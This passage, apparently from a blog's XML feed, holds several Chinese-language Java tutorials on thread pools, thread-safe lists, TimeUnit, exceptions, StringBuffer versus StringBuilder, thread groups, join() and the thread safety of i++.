        <content type="html"><![CDATA[<p>如果你想监控某一个线程池的执行状态，线程池执行类 <code>ThreadPoolExecutor </code> 也给出了相关的 API, 能实时获取线程池的当前活动线程数、正在排队中的线程数、已经执行完成的线程数、总线程数等。</p><blockquote><p>总线程数 &#x3D; 排队线程数 + 活动线程数 +  执行完成的线程数。</p></blockquote><p>下面给出一个线程池使用示例，及教你获取线程池状态。</p><pre class="line-numbers language-none"><code class="language-none">private static ExecutorService es &#x3D; new ThreadPoolExecutor(50, 100, 0L, TimeUnit.MILLISECONDS,new LinkedBlockingQueue&lt;Runnable&gt;(100000));public static void main(String[] args) throws Exception &#123;for (int i &#x3D; 0; i &lt; 100000; i++) &#123;es.execute(() -&gt; &#123;System.out.print(1);try &#123;Thread.sleep(1000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;);&#125;ThreadPoolExecutor tpe &#x3D; ((ThreadPoolExecutor) es);while (true) &#123;System.out.println();int queueSize &#x3D; tpe.getQueue().size();System.out.println(&quot;当前排队线程数：&quot; + queueSize);int activeCount &#x3D; tpe.getActiveCount();System.out.println(&quot;当前活动线程数：&quot; + activeCount);long completedTaskCount &#x3D; tpe.getCompletedTaskCount();System.out.println(&quot;执行完成线程数：&quot; + completedTaskCount);long taskCount &#x3D; tpe.getTaskCount();System.out.println(&quot;总线程数：&quot; + taskCount);Thread.sleep(3000);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>线程池提交了 100000 个任务，但同时只有 50 个线程在执行工作，我们每陋 3 秒来获取当前线程池的运行状态。</p><p>第一次程序输出：</p><pre class="line-numbers language-none"><code class="language-none">当前排队线程数：99950当前活动线程数：50执行完成线程数：0总线程数（排队线程数 + 活动线程数 +  执行完成线程数）：100000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第二次程序输出：</p><pre class="line-numbers language-none"><code class="language-none">当前排队线程数：99800当前活动线程数：50执行完成线程数：150总线程数（排队线程数 + 活动线程数 +  执行完成线程数）：100000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>活动线程数和总线程数是不变的，排队中的线程数和执行完成的线程数不断在变化，直到所有任务执行完毕，最后输出：</p><pre class="line-numbers language-none"><code class="language-none">当前排队线程数：0当前活动线程数：0执行完成线程数：100000总线程数（排队线程数 + 活动线程数 +  执行完成线程数）：100000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样，你了解了这些 API 的使用方法，你想监控线程池的状态就非常方便了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试官问线程安全的List，看完再也不怕了！</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84List%EF%BC%8C%E7%9C%8B%E5%AE%8C%E5%86%8D%E4%B9%9F%E4%B8%8D%E6%80%95%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84List%EF%BC%8C%E7%9C%8B%E5%AE%8C%E5%86%8D%E4%B9%9F%E4%B8%8D%E6%80%95%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近在Java技术知识星球里面有球友问到了线程安全的 List：</p><p><img src="http://img.javastack.cn/20190927184141.png"></p><p>扫码查看答案或加入知识星球</p><p>栈长在之前的文章《<a href="https://mp.weixin.qq.com/s/oA-uEbzNYA4KYwLtRWXRVw">出场率比较高的一道多线程安全面试题</a>》里面讲过 ArrayList 的不安全性。</p><p>那么面试官会问你，既然 ArrayList 是线程不安全的，怎么保证它的线程安全性呢？或者有什么替代方案？</p><p>往下看，看我如何碾压他！</p><p>大部分人会脱口而出：用Vector，这样只会让面试官鄙视！除了Vector，你还会别的吗？</p><p>你至少还得说得上这种：</p><blockquote><p>java.util.Collections.SynchronizedList</p></blockquote><p>它能把所有 List 接口的实现类转换成线程安全的List，比 Vector 有更好的扩展性和兼容性，SynchronizedList的构造方法如下：</p><pre class="line-numbers language-none"><code class="language-none">final List&lt;E&gt; list;SynchronizedList(List&lt;E&gt; list) &#123;    super(list);    this.list &#x3D; list;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SynchronizedList的部分方法源码如下：</p><pre class="line-numbers language-none"><code class="language-none">public E get(int index) &#123;    synchronized (mutex) &#123;return list.get(index);&#125;&#125;public E set(int index, E element) &#123;    synchronized (mutex) &#123;return list.set(index, element);&#125;&#125;public void add(int index, E element) &#123;    synchronized (mutex) &#123;list.add(index, element);&#125;&#125;public E remove(int index) &#123;    synchronized (mutex) &#123;return list.remove(index);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很可惜，它所有方法都是带同步对象锁的，和 Vector 一样，它不是性能最优的。即使你能说到这里，面试官还会继续往下追问，比如在读多写少的情况，SynchronizedList这种集合性能非常差，还有没有更合适的方案？</p><p>介绍两个并发包里面的并发集合类：</p><blockquote><p>java.util.concurrent.CopyOnWriteArrayList<br>java.util.concurrent.CopyOnWriteArraySet</p></blockquote><p>CopyOnWrite集合类也就这两个，Java 1.5 开始加入，你要能说得上这两个才能让面试官信服。</p><h4 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h4><p>CopyOnWrite（简称：COW）：即复制再写入，就是在添加元素的时候，先把原 List 列表复制一份，再添加新的元素。</p><p>先来看下它的 add 方法源码：</p><pre class="line-numbers language-none"><code class="language-none">public boolean add(E e) &#123;    &#x2F;&#x2F; 加锁    final ReentrantLock lock &#x3D; this.lock;    lock.lock();    try &#123;        &#x2F;&#x2F; 获取原始集合        Object[] elements &#x3D; getArray();        int len &#x3D; elements.length;                &#x2F;&#x2F; 复制一个新集合        Object[] newElements &#x3D; Arrays.copyOf(elements, len + 1);        newElements[len] &#x3D; e;                &#x2F;&#x2F; 替换原始集合为新集合        setArray(newElements);        return true;    &#125; finally &#123;        &#x2F;&#x2F; 释放锁        lock.unlock();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加元素时，先加锁，再进行复制替换操作，最后再释放锁。</p><p>再来看下它的 get 方法源码：</p><pre class="line-numbers language-none"><code class="language-none">private E get(Object[] a, int index) &#123;    return (E) a[index];&#125;public E get(int index) &#123;    return get(getArray(), index);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，获取元素并没有加锁。</p><p>这样做的好处是，在高并发情况下，读取元素时就不用加锁，写数据时才加锁，大大提升了读取性能。</p><h4 id="CopyOnWriteArraySet"><a href="#CopyOnWriteArraySet" class="headerlink" title="CopyOnWriteArraySet"></a>CopyOnWriteArraySet</h4><p>CopyOnWriteArraySet逻辑就更简单了，就是使用 CopyOnWriteArrayList 的 addIfAbsent 方法来去重的，添加元素的时候判断对象是否已经存在，不存在才添加进集合。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * Appends the element, if not present. * * @param e element to be added to this list, if absent * @return &#123;@code true&#125; if the element was added *&#x2F;public boolean addIfAbsent(E e) &#123;    Object[] snapshot &#x3D; getArray();    return indexOf(e, snapshot, 0, snapshot.length) &gt;&#x3D; 0 ? false :        addIfAbsent(e, snapshot);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这两种并发集合，虽然牛逼，但只适合于读多写少的情况，如果写多读少，使用这个就没意义了，因为每次写操作都要进行集合内存复制，性能开销很大，如果集合较大，很容易造成内存溢出。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>下次面试官问你线程安全的 List，你可以从 Vector &gt; SynchronizedList &gt; CopyOnWriteArrayList 这样的顺序依次说上来，这样才有带入感，也能体现你对知识点的掌握程度。</p><p>看完有没有收获呢？下次面试应该能秒杀面试官了吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程休眠只会用Thread.sleep？那就弱爆了！</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E4%BC%91%E7%9C%A0%E5%8F%AA%E4%BC%9A%E7%94%A8Thread.sleep%EF%BC%9F%E9%82%A3%E5%B0%B1%E5%BC%B1%E7%88%86%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E4%BC%91%E7%9C%A0%E5%8F%AA%E4%BC%9A%E7%94%A8Thread.sleep%EF%BC%9F%E9%82%A3%E5%B0%B1%E5%BC%B1%E7%88%86%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>线程休眠是 Java 开发经常会用到的一个手段，就是让当前线程睡一会儿，睡醒之后再继续运行。</p><p>咱大多数程序员，多线程虽然学得不好，但线程休眠，无人不知，无人不晓，也都会用，不就是用 Thread.sleep 方法嘛！而且还将它用到那么绝，之前不是还有人写过休眠排序算法和休眠取时间的算法，再来回味下这么脑洞大开的两个算法：</p><ul><li><a href="https://mp.weixin.qq.com/s/Or3q3souk1GGVNB2qvEY2Q">休眠排序算法</a></li><li><a href="https://mp.weixin.qq.com/s/Or3q3souk1GGVNB2qvEY2Q">休眠取时间算法</a></li></ul><p>笑过之后，当然，这不是咋今天要讲的主题，栈长今天要讲的是如何更优雅的让线程休眠。</p><p><strong>来看下面的休眠程序：</strong></p><pre class="line-numbers language-none"><code class="language-none">Thread.sleep(87000000);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你知道休眠多久吗？</p><p>醉了……</p><p><strong>再把上面的稍微改装下：</strong></p><pre class="line-numbers language-none"><code class="language-none">Thread.sleep(24 * 60 * 60 * 1000 + 10 * 60 * 1000);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在你估计大概能知道休眠多久了，但还是很茫然，很无助，不写注释，谁知道休眠多久？单位还是毫秒。。</p><p>其实就是休眠 24 小时 10 分钟，何必整这么麻烦呢？</p><p><strong>优雅又简单的方式来了：</strong></p><pre class="line-numbers language-none"><code class="language-none">TimeUnit.DAYS.sleep(1);TimeUnit.MINUTES.sleep(10);或者 TimeUnit.HOURS.sleep(24);TimeUnit.MINUTES.sleep(10);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>java.util.concurrent.TimeUnit</code> 类就可以优雅的搞定，不需要过多的单位运算及修饰，是不是很优雅，很简单？</p><p>上面演示了 HOURS、MINUTES，还有更多的枚举可以用。</p><p><strong>来看下 TimeUnit 的详细方法和枚举值：</strong></p><p><img src="http://img.javastack.cn/TimeUnit.png"></p><p>其实 TimeUnit 还可以用来做时间单位转换，TimeUnit 提供了各种丰富的时间单位转换方法。</p><p>我们随便来看一个枚举值：</p><pre class="line-numbers language-none"><code class="language-none">MINUTES &#123;    public long toNanos(long d)   &#123; return x(d, C4&#x2F;C0, MAX&#x2F;(C4&#x2F;C0)); &#125;    public long toMicros(long d)  &#123; return x(d, C4&#x2F;C1, MAX&#x2F;(C4&#x2F;C1)); &#125;    public long toMillis(long d)  &#123; return x(d, C4&#x2F;C2, MAX&#x2F;(C4&#x2F;C2)); &#125;    public long toSeconds(long d) &#123; return x(d, C4&#x2F;C3, MAX&#x2F;(C4&#x2F;C3)); &#125;    public long toMinutes(long d) &#123; return d; &#125;    public long toHours(long d)   &#123; return d&#x2F;(C5&#x2F;C4); &#125;    public long toDays(long d)    &#123; return d&#x2F;(C6&#x2F;C4); &#125;    public long convert(long d, TimeUnit u) &#123; return u.toMinutes(d); &#125;    int excessNanos(long d, long m) &#123; return 0; &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以很方便的把分钟转换成各种单位的值。</p><p><strong>再来看一下 TimeUnit 休眠的原理：</strong></p><pre class="line-numbers language-none"><code class="language-none">public void sleep(long timeout) throws InterruptedException &#123;    if (timeout &gt; 0) &#123;        long ms &#x3D; toMillis(timeout);        int ns &#x3D; excessNanos(timeout, ms);        Thread.sleep(ms, ns);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实 TimeUnit 的休眠就是调用了 Thread.sleep 休眠方法，哈哈，只是把 Thread.sleep 封装了，这样，用起来很简单方便，也提高了可读性。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一张图搞清楚Java异常机制</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E4%B8%80%E5%BC%A0%E5%9B%BE%E6%90%9E%E6%B8%85%E6%A5%9AJava%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E4%B8%80%E5%BC%A0%E5%9B%BE%E6%90%9E%E6%B8%85%E6%A5%9AJava%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>下面是Java异常类的组织结构，红色区域的异常类表示是程序需要显示捕捉或者抛出的。</p><p><img src="https://www.programcreek.com/wp-content/uploads/2009/02/Exception-Hierarchy-Diagram.jpeg" alt="image"></p><h3 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h3><p>Throwable是Java异常的顶级类，所有的异常都继承于这个类。</p><p>Error，Exception是异常类的两个大分类。</p><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>Error是非程序异常，即程序不能捕获的异常，一般是编译或者系统性的错误，如OutOfMemorry内存溢出异常等。</p><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>Exception是程序异常类，由程序内部产生。Exception又分为运行时异常、非运行时异常。</p><h4 id="运行时异常"><a href="#运行时异常" class="headerlink" title="运行时异常"></a>运行时异常</h4><p>运行时异常的特点是Java编译器不会检查它，也就是说，当程序中可能出现这类异常，即使没有用try-catch语句捕获它，也没有用throws子句声明抛出它，也会编译通过，运行时异常可处理或者不处理。运行时异常一般常出来定义系统的自定义异常，业务根据自定义异常做出不同的处理。</p><p>常见的运行时异常如NullPointException、ArrayIndexOutOfBoundsException等。</p><h4 id="非运行时异常"><a href="#非运行时异常" class="headerlink" title="非运行时异常"></a>非运行时异常</h4><p>非运行时异常是程序必须进行处理的异常，捕获或者抛出，如果不处理程序就不能编译通过。如常见的IOException、ClassNotFoundException等。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>StringBuffer 和 StringBuilder 的 3 个区别</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/StringBuffer%20%E5%92%8C%20StringBuilder%20%E7%9A%84%203%20%E4%B8%AA%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/StringBuffer%20%E5%92%8C%20StringBuilder%20%E7%9A%84%203%20%E4%B8%AA%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>StringBuffer 和 StringBuilder 它们都是可变的字符串，不过它们之间的区别是 Java 初中级面试出现几率十分高的一道题。这么简单的一道题，栈长在最近的面试过程中，却经常遇到很多求职者说反，搞不清使用场景的情况。</p><p>今天，栈长我带大家彻底搞懂 StringBuffer 和 StringBuilder 的几个区别和它们的应用场景，如果你是大牛，请略过，如果你是菜鸟，或者对这两个不是很清楚，可以学习一下，也可以为年底的面试加油冲刺。</p><p>先看看 StringBuffer 和 StringBuilder 的类结构吧：</p><p><img src="http://img.javastack.cn/18-12-29/23490736.jpg"></p><p>其实很简单，就是继承了一个抽象的字符串父类：<code>AbstractStringBuilder</code>。下面我们再来看看它们的三个区别。</p><h2 id="区别1：线程安全"><a href="#区别1：线程安全" class="headerlink" title="区别1：线程安全"></a>区别1：线程安全</h2><p>StringBuffer：线程安全，StringBuilder：线程不安全。因为 StringBuffer 的所有公开方法都是 synchronized 修饰的，而 StringBuilder 并没有 StringBuilder 修饰。</p><p><strong>StringBuffer 代码片段：</strong></p><pre class="line-numbers language-none"><code class="language-none">@Overridepublic synchronized StringBuffer append(String str) &#123;    toStringCache &#x3D; null;    super.append(str);    return this;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="区别2：缓冲区"><a href="#区别2：缓冲区" class="headerlink" title="区别2：缓冲区"></a>区别2：缓冲区</h2><p><strong>StringBuffer 代码片段：</strong></p><pre class="line-numbers language-none"><code class="language-none">private transient char[] toStringCache;@Overridepublic synchronized String toString() &#123;    if (toStringCache &#x3D;&#x3D; null) &#123;        toStringCache &#x3D; Arrays.copyOfRange(value, 0, count);    &#125;    return new String(toStringCache, true);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>StringBuilder 代码片段：</strong></p><pre class="line-numbers language-none"><code class="language-none">@Overridepublic String toString() &#123;    &#x2F;&#x2F; Create a copy, don&#39;t share the array    return new String(value, 0, count);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，StringBuffer 每次获取 toString 都会直接使用缓存区的 toStringCache 值来构造一个字符串。</p><p>而 StringBuilder 则每次都需要复制一次字符数组，再构造一个字符串。</p><p>所以，缓存冲这也是对 StringBuffer 的一个优化吧，不过 StringBuffer 的这个toString 方法仍然是同步的。</p><h2 id="区别3：性能"><a href="#区别3：性能" class="headerlink" title="区别3：性能"></a>区别3：性能</h2><p>既然 StringBuffer 是线程安全的，它的所有公开方法都是同步的，StringBuilder 是没有对方法加锁同步的，所以毫无疑问，StringBuilder 的性能要远大于 StringBuffer。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以，StringBuffer 适用于用在多线程操作同一个 StringBuffer 的场景，如果是单线程场合 StringBuilder 更适合。</p><p>以此送给正在面试或者即将去面试的 Java 程序猿们，如果对你有帮助，也欢迎分享给身边的朋友们，让大家少走弯路。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程可以分组还能这样玩</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%8F%AF%E4%BB%A5%E5%88%86%E7%BB%84%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%8F%AF%E4%BB%A5%E5%88%86%E7%BB%84%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9/</url>
      
        <content type="html"><![CDATA[<p>但如果线程很多的情况下，你知道如何对它们进行分组吗？</p><p>和 Dubbo 的服务分组一样，Java 可以对相同性质的线程进行分组。</p><p>来看下线程类 Thread 的所有构造方法。</p><p><img src="http://qianniu.javastack.cn/18-6-3/9061041.jpg"></p><p>如图所示，带有 ThreadGroup 的所有线程构造方法都可以定义线程组的。</p><p>线程组使用 java.lang.ThreadGroup 类定义，它有两个构造方法，第二个构造方法允许线程组有父类线程组，也就是说一个线程组可以多个子线程组。</p><pre class="line-numbers language-none"><code class="language-none">java.lang.ThreadGroup#ThreadGroup(java.lang.String)java.lang.ThreadGroup#ThreadGroup(java.lang.ThreadGroup, java.lang.String)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://qianniu.javastack.cn/18-6-4/38415499.jpg"></p><p>线程组中比较有用的几个方法。</p><blockquote><p>&#x2F;&#x2F; 获取当前线程组内的运行线程数<br>java.lang.ThreadGroup#activeCount</p><p>&#x2F;&#x2F; 中断线程组内的所有线程<br>java.lang.ThreadGroup#interrupt</p><p>&#x2F;&#x2F; 使用 System.out 打印出所有线程信息<br>java.lang.ThreadGroup#list()</p></blockquote><p>我们来简单使用下线程组吧！</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public static void main(String[] args) &#123;Runnable runnable &#x3D; () -&gt; &#123;System.out.println(&quot;Java技术线程线程组名称：&quot; + Thread.currentThread().getThreadGroup());System.out.println(&quot;Java技术线程线程名称：&quot; + Thread.currentThread().getName());try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;;ThreadGroup userGroup &#x3D; new ThreadGroup(&quot;user&quot;);    userGroup.setMaxPriority(Thread.MIN_PRIORITY);    Thread userTask1 &#x3D; new Thread(userGroup, runnable, &quot;user-task1&quot;);Thread userTask2 &#x3D; new Thread(userGroup, runnable, &quot;user-task2&quot;);userTask1.start();userTask2.start();System.out.println(&quot;Java技术线程线程组活跃线程数：&quot; + userGroup.activeCount());userGroup.list();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出以下结果。</p><pre class="line-numbers language-none"><code class="language-none">Java技术线程线程组名称：java.lang.ThreadGroup[name&#x3D;user,maxpri&#x3D;1]Java技术线程线程名称：user-task1Java技术线程线程组活跃线程数：2Java技术线程线程组名称：java.lang.ThreadGroup[name&#x3D;user,maxpri&#x3D;1]Java技术线程线程名称：user-task2java.lang.ThreadGroup[name&#x3D;user,maxpri&#x3D;1]    Thread[user-task1,1,user]    Thread[user-task2,1,user]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据示例代码和程序输出结果应该对线程组有了一个大概的了解吧。</p><p>线程组还能统一设置组内所有线程的最高优先级，线程单独设置的优先级不会高于线程组设置的最大优先级。</p><p>另外，线程组中有一个 stop 方法用来终止组内所有的线程，但这个方法和 Thread 中的 stop 方法一样会带来很多问题，所以它们两个现在都已经被废弃了，官方也是不建议使用了，建议使用线程中断功能进行优雅终止线程。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程join使用及原理</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Java%E5%A4%9A%E7%BA%BF%E7%A8%8Bjoin%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Java%E5%A4%9A%E7%BA%BF%E7%A8%8Bjoin%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h2><p>join()是线程类<code>Thread</code>的方法，官方的说明是：</p><blockquote><p>Waits for this thread to die.</p></blockquote><p>等待这个线程结束，也就是说当前线程等待这个线程结束后再继续执行，下面来看这个示例就明白了。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) throws Exception &#123;System.out.println(&quot;start&quot;);Thread t &#x3D; new Thread(() -&gt; &#123;for (int i &#x3D; 0; i &lt; 5; i++) &#123;System.out.println(i);try &#123;Thread.sleep(500);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;&#125;);t.start();t.join();System.out.println(&quot;end&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出：</p><pre class="line-numbers language-none"><code class="language-none">start01234end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>线程t开始后，接着加入t.join()方法，t线程里面程序在主线程end输出之前全部执行完了，说明t.join()阻塞了主线程直到t线程执行完毕。</p><p>如果没有t.join()，end可能会在0~5之间输出。</p><h2 id="join-原理"><a href="#join-原理" class="headerlink" title="join()原理"></a>join()原理</h2><p>下面是join()的源码：</p><pre class="line-numbers language-none"><code class="language-none">public final synchronized void join(long millis)    throws InterruptedException &#123;    long base &#x3D; System.currentTimeMillis();    long now &#x3D; 0;    if (millis &lt; 0) &#123;        throw new IllegalArgumentException(&quot;timeout value is negative&quot;);    &#125;    if (millis &#x3D;&#x3D; 0) &#123;        while (isAlive()) &#123;            wait(0);        &#125;    &#125; else &#123;        while (isAlive()) &#123;            long delay &#x3D; millis - now;            if (delay &lt;&#x3D; 0) &#123;                break;            &#125;            wait(delay);            now &#x3D; System.currentTimeMillis() - base;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出它是利用wait方法来实现的，上面的例子当main方法主线程调用线程t的时候，main方法获取到了t的对象锁，而t调用自身wait方法进行阻塞，只要当t结束或者到时间后才会退出，接着唤醒主线程继续执行。millis为主线程等待t线程最长执行多久，0为永久直到t线程执行结束。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i++是线程安全的吗?</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/i++%E6%98%AF%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/i++%E6%98%AF%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-6-8/12258861.jpg"></p><p><strong>i++ 是线程安全的吗？</strong></p><p>相信很多中高级的 Java 面试者都遇到过这个问题，很多对这个不是很清楚的肯定是一脸蒙逼。内心肯定还在质疑，i++ 居然还有线程安全问题？只能说自己了解的不够多，自己的水平有限。</p><p>先来看下面的示例来验证下 i++ 到底是不是线程安全的。</p><p><strong>1000个线程，每个线程对共享变量 count 进行 1000 次 ++ 操作。</strong></p><pre class="line-numbers language-none"><code class="language-none">static int count &#x3D; 0;static CountDownLatch cdl &#x3D; new CountDownLatch(1000);&#x2F;*** *&#x2F;public static void main(String[] args) throws Exception &#123;CountRunnable countRunnable &#x3D; new CountRunnable();for (int i &#x3D; 0; i &lt; 1000; i++) &#123;new Thread(countRunnable).start();&#125;cdl.await();System.out.println(count);&#125;static class CountRunnable implements Runnable &#123;private void count() &#123;for (int i &#x3D; 0; i &lt; 1000; i++) &#123;count++;&#125;&#125;@Overridepublic void run() &#123;count();cdl.countDown();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的例子我们期望的结果应该是 1000000，但运行 N 遍，你会发现总是不为 1000000，至少你现在知道了 i++ 操作它不是线程安全的了。</p><p>先来看 JMM 模型中对共享变量的读写原理吧。</p><p><img src="http://img.javastack.cn/18-6-8/60972585.jpg"></p><p>每个线程都有自己的工作内存，每个线程需要对共享变量操作时必须先把共享变量从主内存 load 到自己的工作内存，等完成对共享变量的操作时再 save 